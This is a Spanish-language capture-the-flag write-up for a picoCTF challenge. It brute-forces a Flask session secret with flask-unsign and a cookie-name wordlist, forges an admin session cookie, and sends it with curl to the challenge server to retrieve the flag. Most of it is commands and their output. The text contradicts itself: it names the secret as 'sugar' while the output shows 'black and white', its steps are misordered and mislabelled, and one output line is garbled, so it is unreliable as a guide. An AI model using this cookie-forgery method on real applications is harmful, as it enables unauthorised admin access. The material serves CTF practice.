## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
## Solucion
ara esto, se necesita hacer un `nano cookies.txt` para poder usarlo más adelante

```
snickerdoodle
chocolate
chip
oatmeal
gingersnap
shortbread
fortune
gingerbread
sugar
molasses
cornflake
apple
garibaldi
benne
butter
biscuiti
acorn
leaf
peanut
butter
resurreccion
allspice
bell
corn
fudge
lard
liquid
mustard
roast
oregano
pumpkin
sesame
snapper
tea
whitney
ham
mace
rhubarb
onion
bacon
black
pepper
chive
caramel
cornmeal
fig
apple
pie
pastry
chocolate
cherry
pecan
maple
tobacco
silver
apple
fritter
biscos
marshmallow
aduro
```

Ahora, para resolverlo, debemos de usar una herramienta que forma parte de python, pero para usarla en nuestra terminal de kali debemos de realizar un entorno virtual y después instalarlo, algo así:

```shell
python -m venv venv && source venv/bin/activate
python3 -m pip install flask-unsign 
```

Una vez que lo hemos instalado, debemos de saber que cookie es la que nos está mandando, por ejemplo, en mi caso, al introducir snickerdoodle me da la cookie: `eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajQmw.9GkfLaW3NGNPhEG6wxExj7H_yh4` entonces, lo que se va a hacer es primero identificar cual es nuestra clave:

```shell
┌──(venv)(celesteh㉿K-Celeste)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "black and white"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arIC4g.-rG7-BPA0AXXsskrmG2bullUhG8
```

Una vez que se hace, nos dará una salida parecida a esto:

```
──(venv)(celesteh㉿K-Celeste)-[~]
└─$ flask-unsign --unsign --cookie "$COOKIE" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'black and white'
```

La palabra secreta en mi caso fue "sugar", entonces ahora solo nos queda decirle al server que somos admin.

```shell
──(venv)(celesteh㉿K-Celeste)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "black and white"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arIC4g.-rG7-BPA0AXXsskrmG2bullUhG8
```

```
┌──(venv)(celesteh㉿K-Celeste)-[~]
└─$ curl -b "session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arIC4g.-rG7-BPA0AXXsskrmG2bullUhG8" http://wily-courier.picoctf.net:64761/display | grep -i picoCTF
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1186 100   1186   0      0   7556      0                              0
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_98b76c03}</code></p>
            <p>&copy; PicoCTF</p>
```

picoCTF{cO0ki3s_yum_98b76c03}
## Notas adicionales
## Referencias
